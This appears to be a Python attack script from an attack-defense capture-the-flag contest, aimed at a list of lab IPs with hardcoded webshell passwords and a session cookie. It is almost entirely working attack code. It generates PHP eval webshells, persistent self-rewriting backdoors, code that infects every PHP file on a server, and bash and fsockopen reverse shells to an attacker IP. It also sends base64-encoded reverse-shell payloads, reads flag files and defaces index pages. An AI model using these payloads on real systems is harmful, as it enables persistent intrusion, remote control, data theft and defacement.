#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from inspect import isfunction
import hashlib
import logging
import time
from zlib import compress
import requests as req

# %(name)s
logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s [%(levelname)s]\r\n%(message)s')
logger = logging.getLogger(__name__)

SUBMITURL = "http://192.168.80.1/lms/portal/sp/hz_flag.php"
TEAMTOKEN = ""
HEADERS = {
    "Cookie": "SSCSum=50; zlms-sid=jft5no6uc9tstov91k4oaqst85; webcs_test_cookie=lms_cookie_checker; lms_login_name=Ginkgo"
}
SHELLIP = "172.20.107.101"
SHELLPORT = "23333"

IPS = [
    '172.20.108.101'
]

SHELLS = {
    "172.20.102.101": "f34ckd654383568cb46fd8e89f418d4510e38",
    "172.20.104.101": "f34ck6655250204ff892c6d5759499594e679",
    "172.20.105.101": "f34ck1023429ad99e149e42c43198f690f41c",
    "172.20.106.101": "f34ck248e1d24f9a4ac66c779b8b64cd7d383",
    "172.20.108.101": "f34ck345b8455b562332a5a2a543988378465",
    "172.20.109.101": "f34ck1a4c6488b9c2e8f48ff137c1af37b17d",
    "172.20.110.101": "f34ck90805fc71e9606b09ed1970a3b914bed",
    "172.20.111.101": "f34ckeaaae16fabb18c7c06f7781f9e47268d",
    "172.20.112.101": "f34ck4f28014ce7587e60924d455b809ca856",
    "172.20.113.101": "f34ck46d0740acfe1c54a525f32ac28c8f121",
    "172.20.114.101": "f34ck5ecf34701219efddd8f965a8a2f2a7ea"
}
TMPFLAG = []


def b2s(b):
    return b
    # return str(b, encoding='utf-8')


def md5(s):
    hl = hashlib.md5()
    hl.update(s.encode(encoding='utf-8'))
    return hl.hexdigest()


def shells(t=1, fp="", _pwd="virink_shell_password"):
    pwd = md5(_pwd)
    fuck = '<?php if(isset($_POST["{pwd}"])){{@eval($_POST["{pwd}"]);}}'
    if not fp:
        fp = "/var/www/html/virink_no_die.php"
    # normal webshell
    s1 = "<?php @eval($_POST['{pwd}']);?>"
    # no die
    s2 = """    <?php
    set_time_limit(0);ignore_user_abort(1);unlink(__FILE__);
    while(1){{
        file_put_contents({fp},'<?php @eval($_POST["{pwd}"]);?>');sleep(1);
    }}
    ?>
    """
    # all shell
    s3 = """    <?php
    set_time_limit(0);ignore_user_abort(1);unlink(__FILE__);
    function getfiles($path){{
        foreach(glob($path) as $f){{
            if(is_dir($f)){{
                getfiles($f.'/*.php');
            }}else{{
                file_put_contents($f,'<?php @eval($_POST["{pwd}"]);?>'.file_get_content($f));
            }}
        }}
    }}
    while(1){{
        getfiles($_SERVER['DOCUMENT_ROOT'].'/*.php');sleep(1);
    }}
    ?>
    """
    # die down and shell
    s4 = """    <?php
    function getfiles($path){{
        foreach(glob($path) as $afile){{
            if(is_dir($afile)){{
                getfiles($afile.'/*.php');
            }}else{{
                file_put_contents($afile,'<?php if(isset($_POST["{pwd}"])){{@eval($_POST["{pwd}"]);}}else{{sleep(30);die("heiheihei");}}?>');
            }}
        }}
    }}
    getfiles($_SERVER['DOCUMENT_ROOT'].'/*.php');
    """
    # return shell 1
    s5 = """    <?php
    set_time_limit(0);ignore_user_abort(1);unlink(__FILE__);
    system('bash -i >& /dev/tcp/{addr}/{port} 0>&1');
    ?>
    """
    # return shell 2
    s5 = """    <?php
    set_time_limit(0);ignore_user_abort(1);unlink(__FILE__);
    $sock=fsockopen("{addr}",{port});exec("/bin/sh -i <&3 >&3 2>&3");
    ?>
    """
    r = "s%d" % t
    if r in locals():
        shell = locals()[r].format(
            pwd=pwd, fp=fp, addr=SHELLIP, port=SHELLPORT)
        return shell
    else:
        g = ','.join(["s" + i[1:2] for i in locals() if i.startswith("s")])
        logger.warning("Shell is not exist : %s" % r)
        logger.warning("Shell list : %s" % g)
        return False


def autoSubmit(flag, ip):
    if not flag or 'array' in flag:
        return False
    if flag in TMPFLAG:
        logger.info("flag already submit")
        return False
    data = {
        "melee_flag": flag,
        "melee_ip": ip,
        # "token": TEAMTOKEN
    }
    res = req.post(SUBMITURL, data, headers=HEADERS, timeout=2)
    if res.status_code == 200:
        if 'FLAG提交间隔为10S' in res.content:
            logger.info("FLAG提交间隔为10S!")
        elif "已经提交" in res.content:
            logger.info("flag already submit")
        else:
            logger.info("Submit [%s %s] success!" % (ip, flag))
        TMPFLAG.append(flag)
        # logger.error(res.content)
    else:
        logger.error("Submit error")
        logger.error(res.content)
    time.sleep(10)


def webshell(url, data):
    try:
        res = req.post(url, data, timeout=2)
        if res.status_code == 200:
            return res.content
        else:
            return False
    except:
        return False


def exp0(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/a.php'
    p = "echo trim(file_get_contents('/flag.txt'));exit;"
    # p = "file_put_contents"
    data = {
        "c": p
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        if res:
            logger.info("%s %s" % (i, b2s(res)))
            flag = res.strip()
            save_log(i, flag)
            autoSubmit(flag, i)

        else:
            logger.info("error %s" % u)


def exp1(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/a.php'
    p = "echo trim(file_get_contents('/var/www/flag.txt'));exit;"
    data = {
        "c": p
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        if res:
            logger.info("%s %s" % (i, b2s(res)))
            flag = res.strip()
            save_log(i, flag)
            autoSubmit(flag, i)
            time.sleep(10)
        else:
            logger.info("error %s" % u)


def exp2(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/config.php'
    p = "echo trim(file_get_contents('/flag.txt'));exit;"
    data = {
        "c": p
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        if res:
            logger.info("%s %s" % (i, b2s(res)))
            flag = res.strip()
            save_log(i, flag)
            autoSubmit(flag, i)
            time.sleep(10)
        else:
            logger.info("error %s" % u)


def exp3(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/config.php'
    p = "echo trim(file_get_contents('/var/www/flag.txt'));exit;"
    data = {
        "c": p
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        if res:
            logger.info("%s %s" % (i, b2s(res)))
            flag = res.strip()
            save_log(i, flag)
            autoSubmit(flag, i)
            time.sleep(10)
        else:
            logger.info("error %s" % u)


def exp():
    """exp_eval_webshells_getflag"""
    # p = ["echo trim(file_get_contents('/flag.txt'));exit;",
    #      "echo trim(file_get_contents('/var/www/flag.txt'));exit;"]
    p = ['file_put_contents("index.html", base64_decode("PG1ldGEgY2hhcnNldD0idXRmLTgiPjxjZW50ZXI+PHAgc3R5bGU9ImZvbnQtc2l6ZTogMTAwcHgiPkNURi3lpJrmoKHogZTlkIjkuqTmtYFRUee+pDwvcD48cCBzdHlsZT0iZm9udC1zaXplOiAxMDBweCI+NDM4ODE4NTAyPC9wPjwvY2VudGVyPg=="));exit;']
    for i in SHELLS:
        u = "http://" + i + "/f34ck.php"
        for j in p:
            data = {
                SHELLS[i]: j
            }
            res = webshell(u, data)
            if res:
                flag = res.strip()
                save_log(i, flag)
                autoSubmit(flag, i)
            else:
                logger.info(u)


def rs():
    """exp_eval_webshells_getflag"""
    p = 'system(base64_decode("cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4yMC4xMDcuMTAxIiwyMzMzMyk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnICY="));echo 1;'
    for i in SHELLS:
        u = "http://" + i + "/f34ck.php"
        data = {
            SHELLS[i]: p
        }
        res = webshell(u, data)
        print("->>", i, res.content if res else 0)


def rs2(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/config.php'
    p = 'system(base64_decode("cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4yMC4xMDcuMTAxIiwyMzMzMyk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnICY="));echo 1;'
    data = {
        "c": p
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        print("->>", i, res.content if res else 0)


def rs3(n=0):
    """exp_eval_backdoor_getflag"""
    shell = '/a.php'
    p = 'system(base64_decode("cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4yMC4xMDcuMTAxIiwyMzMzMyk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnICY="));echo 1;'
    data = {
        "c": p[0]
    }
    for i in IPS:
        u = "http://" + i + shell
        res = webshell(u, data)
        print("->>", i, res.content if res else 0)


def fuckone():
    ip = "172.20.114.101"
    shell = ["/a.php", "/config.php"]
    p = 'system(base64_decode("cGhwIC1yICckc29jaz1mc29ja29wZW4oIjE3Mi4yMC4xMDcuMTAxIiwyMzMzMyk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsnICY="));echo 1;'
    data = {
        "c": p
    }
    for i in shell:
        u = "http://" + ip + i
        res = req.post(u, data)
        print("->>", u, res.content if res else 0)


def doExp():
    for i in range(10):
        func = "exp%d" % (i)
        if func in globals() and isfunction(globals()[func]):
            logger.info("Function : %s" % func)
            eval(func)()
        else:
            continue


def s2b(s):
    return bytes(s, encoding="utf-8")


def save_log(ip, flag):
    with open('flag.log', 'a') as f:
        f.write("ip : %s\tflag : %s\n" % (ip, flag))


if __name__ == '__main__':
    # test()
    # r = shells(4)
    # print(r)
    try:
        # doExp()
        # exp()
        # rs()
        # rs2()
        rs3()
        # fuckone()
    except Exception as e:
        logger.error(e)
